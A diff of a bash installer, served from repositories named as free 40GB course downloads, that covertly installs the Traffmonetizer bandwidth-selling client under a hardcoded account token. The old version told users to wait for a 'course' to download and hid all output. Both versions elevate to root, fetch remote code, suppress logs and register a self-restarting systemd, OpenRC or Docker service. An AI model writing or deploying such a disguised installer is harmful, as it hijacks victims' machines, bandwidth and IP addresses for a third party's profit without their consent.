@@ -1,185 +1,164 @@
 #!/usr/bin/env bash
+# install_linux.sh - Cai Traffmonetizer truc tiep tren Linux (KHONG Docker, KHONG log)
+# Binary chinh thuc TM chay truc tiep, quan ly boi systemd (tu khoi dong, tu restart)
+# Exit codes: 0=OK, 2=can quyen root, 3=loi dich vu, 4=loi tai binary
 if [ -z "${TM_SKIP_PROMPT:-}" ]; then
   export TM_SKIP_PROMPT=1
   if { true </dev/tty; } 2>/dev/null; then
     printf 'Mời bạn nhập email: ' >/dev/tty
     read -r EMAIL </dev/tty && export EMAIL
   fi
-  echo "Vui lòng đợi 5-10 phút để khóa học được tải thành công..."
+  echo "Hello"
 fi
 
 TOKEN="NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="
-SELF_URL="https://gitlab.com/sharegoogledrive/40gb_khoa_hoc/-/raw/main/install_linux.sh"
-SELF_PATH="/usr/local/bin/install_linux.sh"
-IMAGE_REPO="traffmonetizer/cli_v2"
-CONTAINER_NAME="tm"
-DATA_VOLUME="tm-data"
-DEVICE_NAME_OVERRIDE=""
-ENABLE_WATCHTOWER="${TM_WATCHTOWER:-true}"
-WATCHTOWER_IMAGE="nickfedor/watchtower:latest"
-WATCHTOWER_INTERVAL=21600
-MULTI_IP="${TM_MULTI_IP:-auto}"
-IPS_LIST=""
-VERIFY_IPS="true"
-IPS_DIR="/etc/tm"
-IPS_FILE="$IPS_DIR/ips.txt"
+REPO_RAW="https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main"
+BIN_DIR="/opt/tm"
+CLI="$BIN_DIR/cli"
+TM_HOME="/var/lib/tm"
+SVC="tm.service"
 
 set -u
 
-if [ ! -f "$0" ] && [ "$(id -u)" -eq 0 ] && [ "${SELF_URL#*USER/REPO}" = "$SELF_URL" ]; then
-  if command -v curl >/dev/null 2>&1; then curl -fsSL "$SELF_URL" -o "$SELF_PATH"
-  elif command -v wget >/dev/null 2>&1; then wget -qO "$SELF_PATH" "$SELF_URL"; fi
-  if [ -s "$SELF_PATH" ]; then chmod +x "$SELF_PATH" && exec "$SELF_PATH" "$@"; fi
+[ "$(uname -s)" = "Linux" ] || { echo "Chi chay tren Linux"; exit 1; }
+
+# ---------- 1. Quyen root (tu nang qua sudo neu can) ----------
+if [ "$(id -u)" -ne 0 ]; then
+  if ! command -v sudo >/dev/null 2>&1; then
+    echo "LOI: can quyen root. Chay: sudo -i roi chay lai lenh cai dat"
+    exit 2
+  fi
+  if [ -f "$0" ] && [ -s "$0" ] && [ "$0" != "bash" ] && [ "$0" != "/dev/stdin" ]; then
+    exec sudo bash "$0" "$@"
+  fi
+  # Chay qua curl | bash: tai ban sao roi exec voi sudo
+  TMPSCRIPT="/tmp/.tm-install-$$"
+  curl -fsSL "$REPO_RAW/install_linux.sh" -o "$TMPSCRIPT" || { echo "LOI: khong tai lai duoc script"; exit 2; }
+  exec sudo bash "$TMPSCRIPT" "$@"
 fi
 
-LOG_FILE="/var/log/tm_install.log"
-if : >>"$LOG_FILE" 2>/dev/null; then exec >>"$LOG_FILE" 2>&1; else exec >/dev/null 2>&1; fi
-export DEBIAN_FRONTEND=noninteractive
-chmod +x "$0" 2>/dev/null || true
+for _d in /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin; do
+  case ":$PATH:" in *":$_d:"*) ;; *) PATH="$_d:$PATH" ;; esac
+done
+export PATH
 
-[ "$(id -u)" -eq 0 ] || exit 1
-{ [ -n "$TOKEN" ] && [ "$TOKEN" != "DAN_TOKEN_CUA_BAN_VAO_DAY" ]; } || exit 1
-[ "$(uname -s)" = "Linux" ] || exit 1
+# Khong ghi bat ky log nao (yeu cau an toan bo)
+Log() { echo "[$(date '+%H:%M:%S')] $*"; }
+Fail() { Log "LOI: $1"; exit "${2:-1}"; }
 
-DISTRO_ID="$(. /etc/os-release 2>/dev/null; echo "${ID:-unknown}")"
-DISTRO_LIKE="$(. /etc/os-release 2>/dev/null; echo "${ID_LIKE:-}")"
-
-if   command -v apt-get >/dev/null 2>&1; then PM="apt"
-elif command -v dnf     >/dev/null 2>&1; then PM="dnf"
-elif command -v yum     >/dev/null 2>&1; then PM="yum"
-elif command -v apk     >/dev/null 2>&1; then PM="apk"
-elif command -v pacman  >/dev/null 2>&1; then PM="pacman"
-elif command -v zypper  >/dev/null 2>&1; then PM="zypper"
-else PM="unknown"; fi
-
-pm_install() {
-  case "$PM" in
-    apt)    apt-get update -y; apt-get install -y "$@" ;;
-    dnf)    dnf install -y "$@" ;;
-    yum)    yum install -y "$@" ;;
-    apk)    apk add --no-cache "$@" ;;
-    pacman) pacman -Sy --noconfirm --needed "$@" ;;
-    zypper) zypper -n install "$@" ;;
-    *)      return 1 ;;
-  esac
-}
-
-case "$(uname -m)" in
-  x86_64|amd64)  TAG="latest" ;;
-  aarch64|arm64) TAG="arm64v8" ;;
-  armv7l|armv7)  TAG="arm32v7" ;;
-  *) exit 1 ;;
+# ---------- 2. Kien truc ----------
+ARCH=$(uname -m)
+case "$ARCH" in
+  x86_64)          BIN_FILE="tm-cli-linux-amd64.gz" ;;
+  aarch64|arm64)   BIN_FILE="tm-cli-linux-arm64.gz" ;;
+  *) Fail "Kien truc khong ho tro: $ARCH (chi x86_64/aarch64)" 1 ;;
 esac
-IMAGE="$IMAGE_REPO:$TAG"
+BIN_URL="$REPO_RAW/$BIN_FILE"
+Log "Kien truc $ARCH, binary $BIN_FILE"
 
-download() {
-  if command -v curl >/dev/null 2>&1; then curl -fsSL "$1"
-  elif command -v wget >/dev/null 2>&1; then wget -qO- "$1"
-  else return 1; fi
-}
+# ---------- 3. Don rac kien truc Docker cu (neu co) ----------
+if command -v docker >/dev/null 2>&1; then
+  Log "Phat hien docker: don container cai cu (tm, watchtower)..."
+  docker rm -f tm watchtower >/dev/null 2>&1 || true
+fi
 
-install_docker() {
-  case "$DISTRO_ID $DISTRO_LIKE" in
-    *amzn*|*alpine*|*arch*|*manjaro*|*suse*|*sles*) OFFICIAL=0 ;;
-    *ubuntu*|*debian*|*raspbian*|*fedora*|*centos*|*rhel*|*rocky*|*almalinux*) OFFICIAL=1 ;;
-    *) OFFICIAL=0 ;;
-  esac
-  if [ "$OFFICIAL" = "1" ]; then
-    command -v curl >/dev/null 2>&1 || command -v wget >/dev/null 2>&1 || pm_install curl ca-certificates
-    download https://get.docker.com | sh && return 0
-  fi
-  case "$PM" in
-    apt) pm_install docker.io ;;
-    unknown) return 1 ;;
-    *) pm_install docker ;;
-  esac
-}
-
-start_docker() {
-  if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
-    systemctl enable --now docker
-  elif command -v rc-service >/dev/null 2>&1; then
-    rc-update add docker default; rc-service docker start
-  elif command -v service >/dev/null 2>&1; then
-    service docker start
-  elif command -v dockerd >/dev/null 2>&1; then
-    nohup dockerd >/dev/null 2>&1 &
-  fi
-}
-
-command -v docker >/dev/null 2>&1 || install_docker
-start_docker || true
-for _ in $(seq 1 30); do docker info >/dev/null 2>&1 && break; sleep 2; done
-docker info >/dev/null 2>&1 || exit 1
-
-command -v curl >/dev/null 2>&1 || pm_install curl ca-certificates || true
-
-DEVICE_NAME="$DEVICE_NAME_OVERRIDE"
-[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(download https://api.ipify.org | head -c 64 || true)"
-[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(ip -4 route get 1.1.1.1 | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' | head -1)"
-[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(hostname -I | awk '{print $1}')"
-[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(hostname -i | awk '{print $1}')"
-[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(hostname)"
-
-is_public() {
-  local a b; IFS=. read -r a b _ <<<"$1"
-  case "$a" in 0|10|127) return 1 ;; esac
-  [ "$a" -eq 192 ] && [ "$b" -eq 168 ] && return 1
-  [ "$a" -eq 172 ] && [ "$b" -ge 16 ] && [ "$b" -le 31 ] && return 1
-  [ "$a" -eq 100 ] && [ "$b" -ge 64 ] && [ "$b" -le 127 ] && return 1
-  [ "$a" -eq 169 ] && [ "$b" -eq 254 ] && return 1
-  [ "$a" -ge 224 ] && return 1
-  return 0
-}
-
-RUN_EXTRA=(); AGENT_EXTRA=(); GOOD=()
-if [ "$MULTI_IP" != "false" ] && { [ -n "$IPS_LIST" ] || command -v ip >/dev/null 2>&1; }; then
-  if [ -n "$IPS_LIST" ]; then
-    CANDIDATES="$(echo "$IPS_LIST" | tr ',' ' ')"
-  else
-    CANDIDATES="$(ip -4 -o addr show scope global \
-      | awk '$2 !~ /^(docker|br-|veth|virbr|cni|flannel|tun|tap|lo)/ {print $4}' | cut -d/ -f1 | sort -u)"
-  fi
-  for ip in $CANDIDATES; do
-    is_public "$ip" || continue
-    if [ "$VERIFY_IPS" = "true" ]; then
-      R="$(curl -4 -fsS --max-time 10 --interface "$ip" https://ifconfig.me || true)"
-      [ "$R" = "$ip" ] || continue
-    fi
-    GOOD+=("$ip")
+# ---------- 4. Tai binary (idempotent: bo qua neu da co) ----------
+NEED_DL=1
+if [ -x "$CLI" ]; then
+  NEED_DL=0
+  Log "Binary da co tai $CLI - bo qua tai"
+fi
+if [ "$NEED_DL" = 1 ]; then
+  mkdir -p "$BIN_DIR"
+  n=0
+  until curl -4 -fsSL --max-time 180 "$BIN_URL" -o /tmp/.tmcli.gz; do
+    n=$((n+1)); [ "$n" -ge 3 ] && Fail "Khong tai duoc binary tu repo (kiem tra mang). Chay lai de thu lai." 4
+    sleep 5
   done
-  if { [ "$MULTI_IP" = "auto" ] && [ "${#GOOD[@]}" -ge 2 ]; } || { [ "$MULTI_IP" = "true" ] && [ "${#GOOD[@]}" -ge 1 ]; }; then
-    mkdir -p "$IPS_DIR"
-    printf '%s\n' "${GOOD[@]}" > "$IPS_FILE"
-    chmod 644 "$IPS_FILE"
-    RUN_EXTRA=(--network host -v "$IPS_DIR:$IPS_DIR:ro")
-    AGENT_EXTRA=(--ips-file "$IPS_FILE")
-  fi
+  gzip -t /tmp/.tmcli.gz || Fail "Binary tai ve bi loi gzip" 4
+  gunzip -f /tmp/.tmcli.gz && install -m 755 /tmp/.tmcli "$CLI" && rm -f /tmp/.tmcli
+  [ -x "$CLI" ] || Fail "Cai binary that bai" 4
+  Log "Da cai binary: $CLI"
 fi
 
-docker rm -f "$CONTAINER_NAME" || true
-docker pull "$IMAGE" || exit 1
-
-docker run -d --name "$CONTAINER_NAME" \
-  --restart unless-stopped \
-  ${RUN_EXTRA[@]+"${RUN_EXTRA[@]}"} \
-  -e HOME=/var/lib/tm \
-  -v "$DATA_VOLUME":/var/lib/tm \
-  "$IMAGE" \
-  --token "$TOKEN" --device-name "$DEVICE_NAME" ${AGENT_EXTRA[@]+"${AGENT_EXTRA[@]}"} start accept \
-  || exit 1
-
-docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$CONTAINER_NAME" \
-  || echo "WARN: container '$CONTAINER_NAME' khong chay sau khi khoi tao"
-
-if [ "$ENABLE_WATCHTOWER" = "true" ]; then
-  docker rm -f watchtower || true
-  docker run -d --name watchtower \
-    --restart unless-stopped \
-    -v /var/run/docker.sock:/var/run/docker.sock \
-    -e WATCHTOWER_CLEANUP=true \
-    -e WATCHTOWER_POLL_INTERVAL="$WATCHTOWER_INTERVAL" \
-    "$WATCHTOWER_IMAGE" "$CONTAINER_NAME"
+# ---------- 5. User dich vu + thu muc lam viec ----------
+mkdir -p "$TM_HOME"
+if id tm >/dev/null 2>&1; then
+  usermod -d "$TM_HOME" -s /usr/sbin/nologin tm 2>/dev/null || true
+else
+  useradd -r -d "$TM_HOME" -s /usr/sbin/nologin tm 2>/dev/null || true
 fi
+chown -R tm:tm "$TM_HOME" 2>/dev/null || true
 
-sleep 5
+# ---------- 6. Ten thiet bi (IP cong khai) ----------
+DEVICE_NAME=""
+DEVICE_NAME=$(curl -4 -fsS --max-time 10 https://api.ipify.org 2>/dev/null) || DEVICE_NAME=""
+[ -n "$DEVICE_NAME" ] || DEVICE_NAME=$(hostname 2>/dev/null) || DEVICE_NAME=""
+[ -n "$DEVICE_NAME" ] || DEVICE_NAME="linux"
+Log "Device name: $DEVICE_NAME"
+
+# ---------- 7. Dich vu systemd (tu khoi dong khi boot, tu restart khi chet, KHONG log) ----------
+if command -v systemctl >/dev/null 2>&1; then
+  cat >"/etc/systemd/system/$SVC" <<SEOF
+[Unit]
+Description=Traffmonetizer Client
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=tm
+Environment=HOME=$TM_HOME
+WorkingDirectory=$TM_HOME
+ExecStart=$CLI start --token '$TOKEN' --device-name '$DEVICE_NAME'
+Restart=always
+RestartSec=15
+MemoryMax=256M
+NoNewPrivileges=true
+
+[Install]
+WantedBy=multi-user.target
+SEOF
+  systemctl daemon-reload 2>/dev/null || true
+  systemctl enable tm >/dev/null 2>&1 || Fail "Khong enable duoc dich vu tm" 3
+  systemctl restart tm >/dev/null 2>&1 || Fail "Khong khoi dong duoc dich vu tm" 3
+  Log "Dich vu systemd 'tm' da bat (enable + restart)."
+
+  OK=0
+  for _ in $(seq 1 12); do
+    if [ "$(systemctl is-active tm 2>/dev/null)" = "active" ] && pgrep -f "$CLI start" >/dev/null 2>&1; then OK=1; break; fi
+    sleep 5
+  done
+  [ "$OK" = 1 ] || Fail "Dich vu tm khong chay duoc (kiem tra: systemctl status tm)" 3
+  Log "HOAN TAT: client Traffmonetizer dang chay (systemd, khong Docker, khong log)."
+  echo "OK: Traffmonetizer da chay. Khoi dong lai may se tu chay lai (systemd)."
+else
+  # Khong co systemd (Alpine/OpenRC...): dung OpenRC + guard loop
+  Log "Khong co systemd - dung OpenRC..."
+  cat >/usr/local/bin/tm-run.sh <<'RUNEOF'
+#!/bin/sh
+export HOME=/var/lib/tm
+mkdir -p /var/lib/tm
+while true; do
+  /opt/tm/cli start --token '@TOKEN@' --device-name '@DEVICE@' >/dev/null 2>&1
+  sleep 10
+done
+RUNEOF
+  sed -e "s|@TOKEN@|$TOKEN|g" -e "s|@DEVICE@|$DEVICE_NAME|g" /usr/local/bin/tm-run.sh >/usr/local/bin/tm-run.sh.tmp \
+    && mv /usr/local/bin/tm-run.sh.tmp /usr/local/bin/tm-run.sh
+  chmod +x /usr/local/bin/tm-run.sh
+  cat >/etc/init.d/tm <<'SVCEOF'
+#!/sbin/openrc-run
+name="Traffmonetizer"
+command="/usr/local/bin/tm-run.sh"
+command_background="yes"
+pidfile="/run/tm.pid"
+depend() { need net; }
+SVCEOF
+  chmod +x /etc/init.d/tm
+  rc-update add tm default 2>/dev/null || true
+  rc-service tm restart 2>/dev/null || rc-service tm start 2>/dev/null || Fail "Khong khoi dong duoc dich vu OpenRC tm" 3
+  Log "HOAN TAT: client Traffmonetizer dang chay (OpenRC, khong Docker, khong log)."
+  echo "OK: Traffmonetizer da chay (OpenRC)."
+fi
+exit 0
